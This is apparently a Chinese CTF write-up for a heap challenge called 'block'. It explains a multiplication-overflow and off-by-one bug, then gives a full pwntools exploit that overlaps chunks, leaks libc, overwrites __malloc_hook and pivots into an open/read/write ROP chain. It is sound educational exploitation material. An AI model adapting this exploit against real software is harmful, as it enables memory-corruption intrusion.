## 题解

### 漏洞

初始的gas值为 0x125800

![](./assets/1.png)

由于gas值的限制，这里表面是不能创建size过大的 block 的，

![](./assets/2.png)

但是这里的判断其实是存在乘法溢出漏洞的，利用乘法的进位使得恰好溢出，控制溢出以后的值小于gas即可通过判断，这时通过判断的条件的会是一个极大的size值，于是计算出来的当前block的gas值=8*size，也会是个极大值。虽然之后 calloc(1, size) 会失败，但是当前 block 已经保存了相应的gas值。之后在销毁block的时候没有判断block中的ptr位置是否为空，就会将该block的gas值加入到总的gas中，使得gas变成一个极大值

![](./assets/3.png)

这样之后创建block的时候，就能解除size大小的限制。

同时，在创建block的时候，会给 size | 1，然后保存在block的size位置，之后再次编辑该block的时候，按照保存在block中size，就会产生 off-by-one漏洞



### 利用

程序一开始利用seccomp设置了沙盒，不能执行execve的系统调用，所以这里不能get shell。

![](./assets/4.png)

同时又在创建block的时候使用的是 calloc 函数，所以在申请chunk的时候会跳过 tcache，也就无法用tcache attack。

最后的利用思路是，先通过乘法溢出，解除创建block时的size限制，利用off-by-one漏洞构造overlapping，从而泄露heap地址和libc地址，同时利用overlapping完成fastbin attack，从而能覆写`__malloc_hook`，由于不能get shell，所以这里不能将`__malloc_hook`直接覆写为one_gadget。这里可以利用calloc函数的特性，即calloc 函数使用 rbp 当做寄存器变量来存储传入的 size，所以可以控制其 size ，同时将`__malloc_hook`覆写为 leave; ret; 这样gadgets的地址，之后调用calloc函数时，就能进行栈转移。可以在堆上布置ROP来读 flag。

具体详见exp。

```python
from pwn import *

# context.log_level = 'debug'

# io = process('./block')
io = remote('192.168.112.134', 6666)
elf = ELF('./block')
libc = ELF('./libc-2.27.so')

rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))

text ='''heapinfo
heap
x/80gx $heap
'''

def Menu(cmd):
	sla('Choice >> ', str(cmd))

def Add(Atype, size, content=''):
	Menu(1)
	sla('type: ', str(Atype))
	sla('size: ', str(size))
	if content != '':
		sa('content: ', content)

def Del(idx):
	Menu(2)
	sla('index: ', str(idx))

def Show(idx):
	Menu(3)
	sla('index: ', str(idx))

def Edit(idx, content):
	Menu(4)
	sla('index: ', str(idx))
	sa('content: ', content)

# multiplication overflow
Add(1, 0x119453808ca29c1)
Del(0)

# off-by-one and overlap
Add(1, 0x430, 'A'*0x10+'\n') #0

Add(3, 0x68, 'B'*0x10+'\n') #1
Add(3, 0x68, 'B'*0x10+'\n') #2

Add(1, 0x440, 'A'*0x10+'\n') #3

Add(3, 0x68, 'B'*0x10+'\n') #4 padding

Del(0)

payload = 'B'*0x60
payload += p64(0x520) + p8(0x50)
Edit(2, payload)
Del(3)

# leak heap_base and libc_base
Add(1, 0x430, '\n') #0
Add(1, 0x550, '\n') #3 put into largebin

Show(1)
ru('The content is ')
libc_base = uu64(rn(8)) - 0x3ec0d0
lg('libc_base')

rn(8)
heap_base = uu64(rn(8)) - 0x1230
lg('heap_base')


# fastbin attack and ROP
Del(2)

malloc_hook = libc_base + libc.sym['__malloc_hook']
payload = 'A'*0x60
payload += p64(0) + p64(0x71)
payload += p64(malloc_hook-0x23)
Add(3, 0x80, payload+'\n') #2

rdi_ret = libc_base + 0x000000000002155f
rsi_ret = libc_base + 0x0000000000023e8a
rdx_ret = libc_base + 0x0000000000001b96
rax_ret = libc_base + 0x0000000000043a78
syscall_ret = libc_base + 0x00000000000d29d5

payload = p64(0)*10

payload += p64(rdi_ret)
payload += p64(heap_base+0x12b0)
payload += p64(rsi_ret)
payload += p64(0)
payload += p64(rax_ret)
payload += p64(2)
payload += p64(syscall_ret)

payload += p64(rdi_ret)
payload += p64(3)
payload += p64(rsi_ret)
payload += p64(heap_base+0x1240)
payload += p64(rdx_ret)
payload += p64(0x20)
payload += p64(rax_ret)
payload += p64(0)
payload += p64(syscall_ret)

payload += p64(rdi_ret)
payload += p64(1)
payload += p64(rsi_ret)
payload += p64(heap_base+0x1240)
payload += p64(rdx_ret)
payload += p64(0x20)
payload += p64(rax_ret)
payload += p64(1)
payload += p64(syscall_ret)
Add(3, 0x140, payload+'\n') #5

Add(3, 0x68, 'flag\x00\n')	#6

leave_ret = libc_base + 0x0000000000034d33
payload = '\x00'*0x13
payload += p64(leave_ret)
Add(3, 0x68, payload+'\n') #7

# dbg(text)
# pause()
Add(1, heap_base+0x1318) #trigger

irt()
```



